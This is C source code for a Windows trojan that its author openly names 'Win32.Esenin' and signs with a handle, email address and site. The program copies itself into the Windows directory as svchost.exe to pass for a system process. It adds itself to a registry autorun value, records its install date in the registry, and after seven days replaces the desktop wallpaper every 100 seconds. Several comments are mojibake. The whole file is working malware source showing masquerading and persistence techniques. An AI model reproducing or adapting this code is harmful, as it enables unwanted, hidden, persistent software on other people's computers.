// Win32.Esenin.
// This is my first Win32 trojan.
// After 7 days after first running ever 100 sec changes wallpapaper on predefined. 
//
// Autor: Bill Prisoner / TPOC
// E-Mail: bill_tpoc@mail.ru
// WWW: thepoc.exploiterz.org
//
// LastUpdateCode Date: 20.10.2005
/// LastBuild Date: 20.10.2005 3:15

#include <windows.h>
#include <time.h>
#include "BinData.cpp"


void Copy(void)
{
	char FileName[256],String[256];;
	GetModuleFileName(0,FileName,256);
//���� � ��������
	GetWindowsDirectory(String,255);
	lstrcat(String,"\\svchost.exe");
	CopyFile(FileName,String,TRUE);
}

DWORD Autorun(void)
{
	char String[256];
	HKEY hKey;
//���� � ��������
	GetWindowsDirectory(String,255);
	lstrcat(String,"\\svchost.exe");
//������ � ������
	DWORD ret = RegOpenKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows",&hKey);
	if (ret==ERROR_SUCCESS)
	{
		ret = RegSetValueEx(hKey,"Run",0,REG_SZ,(const unsigned char *)String,lstrlen(String));
	}
	if (ret==ERROR_SUCCESS)
		return TRUE;
	else 
		return FALSE;
}

DWORD FirstRun(void)
{
	HKEY hKey;
	RegOpenKey(HKEY_CURRENT_USER,"Software\\TPOC",&hKey);
	if (hKey == 0) 
		return TRUE;
	else
		return FALSE;
}

DWORD Registry()
{
//�������� ������� ����
	struct tm *newtime;
	char am_pm[] = "AM";
	time_t long_time;

	time( &long_time );
	newtime = localtime( &long_time );
	HKEY hKey;
	DWORD ret = RegCreateKey(HKEY_CURRENT_USER,"Software\\TPOC",&hKey);
	DWORD Counter=newtime->tm_yday;;//�������� �������� ���������� � �������
//���������� � ����� ������� �������� 
	if (ret==ERROR_SUCCESS)
	{
		ret = RegSetValueEx(hKey,"Counter",0,REG_DWORD,(const unsigned char *)&Counter,4);
	}
	return ret;

}

DWORD DiffDate(void)
{
//�������� ������� ����
	struct tm *newtime;
	char am_pm[] = "AM";
	time_t long_time;

	time( &long_time );
	newtime = localtime( &long_time );
	HKEY hKey;
	DWORD ret = RegCreateKey(HKEY_CURRENT_USER,"Software\\TPOC",&hKey);
	DWORD OldDate=newtime->tm_yday;
	DWORD CurrentDate=0,Size = 4;
	ret = RegQueryValueEx(hKey,"Counter",0,NULL,(unsigned char *)&CurrentDate,&Size);
	return OldDate-CurrentDate;

}

void SetWallpaper(void)
{
	char String[256];
//���� � ��������
	GetWindowsDirectory(String,255);
	lstrcat(String,"\\svchost.bmp");
//������� ����������� �������
	HANDLE hFile = CreateFile(String,FILE_ALL_ACCESS,0,NULL,CREATE_NEW,FILE_ATTRIBUTE_NORMAL,NULL);
	DWORD BytesWritten;
	WriteFile(hFile,bin,sizeof(bin),&BytesWritten,NULL);
	CloseHandle(hFile);
//�������� ������� ����
	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, String, SPIF_SENDCHANGE);
}

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
//���� ������ � �����, ��...
	if (FirstRun())
	{
//�������� ���� � ����� Windows � ������ %SystemRoot%\svchost.exe
		Copy();
//����������� � �����������
		Autorun();
//����������� � �������
		Registry();
//����� �� ���������
		return 0;
	}
//���� ������ ���� ����, ��...
	if (DiffDate()>=7)
		while (TRUE)
		{
			Sleep(100000);
			SetWallpaper();
		}
	return 0;
}